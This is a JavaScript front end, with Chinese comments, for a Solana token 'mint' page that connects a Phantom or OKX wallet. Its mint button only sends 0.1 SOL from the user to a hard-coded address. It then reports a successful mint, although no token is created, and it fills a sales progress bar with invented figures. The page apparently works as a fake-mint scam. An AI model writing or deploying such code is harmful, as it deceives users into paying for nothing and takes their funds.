// 解决 Buffer 未定义的问题
import { Buffer } from "https://esm.sh/buffer";
window.Buffer = Buffer;

const connectWalletButton = document.getElementById('connectWallet');
const mintButton = document.getElementById('mintButton');
const amountInput = document.getElementById('amount');
const statusDisplay = document.getElementById('status');

let payer;
let connection;
let programId;

// 检测是否安装了 Phantom 或 OKX 钱包
const isPhantomInstalled = window.solana && window.solana.isPhantom;
if (!isPhantomInstalled && !window.okxwallet) {
  connectWalletButton.disabled = true;
  statusDisplay.textContent = "未检测到钱包，请安装 Phantom 钱包 或 OKX 钱包!";
}

async function connectWallet() {
  try {
    let solana;
    if (window.okxwallet) {
      solana = window.okxwallet.solana;
    } else if (window.solana) {
      solana = window.solana;
    } else {
      statusDisplay.textContent = "未检测到钱包，请安装 Phantom 钱包 或 OKX 钱包!";
      return;
    }
    await solana.connect();
    payer = { publicKey: solana.publicKey };

    // 使用同一个 RPC 端点作为代理转发后端服务，但用于发送交易时可以直接使用 RPC（此处依然使用官方 RPC）
    connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", 'confirmed');

    statusDisplay.textContent = `已连接钱包: ${payer.publicKey.toBase58()}`;
    connectWalletButton.textContent = '断开钱包';
    mintButton.disabled = false;
    connectWalletButton.removeEventListener('click', connectWallet);
    connectWalletButton.addEventListener('click', disconnectWallet);

  } catch (error) {
    console.error("Connection failed:", error);
    statusDisplay.textContent = "连接钱包失败. 请检查 Solana 是否已安装并正确配置.";
  }
}

async function disconnectWallet() {
  payer = null;
  connection = null;
  programId = null;

  statusDisplay.textContent = "钱包已断开.";
  connectWalletButton.textContent = '连接钱包';
  mintButton.disabled = true;
  connectWalletButton.removeEventListener('click', disconnectWallet);
  connectWalletButton.addEventListener('click', connectWallet);
}

connectWalletButton.addEventListener('click', connectWallet);

// 通过代理获取最新 blockhash
async function getLatestBlockhashViaProxy() {
  const proxyUrl = "http://localhost:3000/rpc"; // 或替换为你的公开代理服务器地址
  const requestBody = {
    jsonrpc: "2.0",
    id: 1,
    method: "getLatestBlockhash",
    params: ["confirmed"]
  };

  const response = await fetch(proxyUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(requestBody)
  });
  const data = await response.json();
  if (data.error) {
    throw new Error(data.error.message);
  }
  return data.result;
}

mintButton.addEventListener('click', async () => {
  const amount = parseInt(amountInput.value);
  const recipientPublicKey = '2wdjheNt1g6RHQqt4mm12oNt6PX4w53S1ivry31Gm6PD'; // 替换为实际地址
  const mintAmount = 10000;

  if (isNaN(amount) || amount !== 1) {
    statusDisplay.textContent = "铸造数量无效. 单次只能铸造一份.";
    return;
  }

  if (!payer) {
    statusDisplay.textContent = "请先连接钱包.";
    return;
  }

  try {
    statusDisplay.textContent = "铸造中...请等待.";

    // Transfer 0.1 SOL
    const lamports = 0.1 * solanaWeb3.LAMPORTS_PER_SOL;
    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: payer.publicKey,
        toPubkey: new solanaWeb3.PublicKey(recipientPublicKey),
        lamports: lamports,
      })
    );

    // 通过代理获取最新的 blockhash
    const { blockhash } = await getLatestBlockhashViaProxy();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = payer.publicKey;

    let signedTransaction;
    if (window.okxwallet) {
      signedTransaction = await window.okxwallet.solana.signTransaction(transaction);
    } else if (window.solana) {
      signedTransaction = await window.solana.signTransaction(transaction);
    } else {
      statusDisplay.textContent = "未检测到钱包，请安装 Phantom 钱包 或 OKX 钱包!";
      return;
    }

    const serializedTransaction = new Uint8Array(signedTransaction.serialize());
    const signature = await connection.sendRawTransaction(serializedTransaction);
    await connection.confirmTransaction(signature, 'confirmed');

    console.log('Transaction completed:', signature);
    statusDisplay.textContent = `铸造成功! 交易ID: ${signature}`;

  } catch (error) {
    console.error("Minting failed:", error);
    statusDisplay.textContent = `铸造失败: ${error.message}`;
  }
});

// 更新铸造进度条
function updateSalesProgress(currentSales, totalSupply) {
  const percentage = (currentSales / totalSupply) * 100;
  const progressBar = document.getElementById('salesProgressBar');
  const salesPercentageDisplay = document.getElementById('salesPercentage');

  progressBar.style.width = `${percentage}%`;
  salesPercentageDisplay.textContent = `${percentage.toFixed(2)}%`;
}

// 示例用法 (用实际数据替换)
const totalSupply = 21000000;
let currentSales = 10500000;

updateSalesProgress(currentSales, totalSupply);
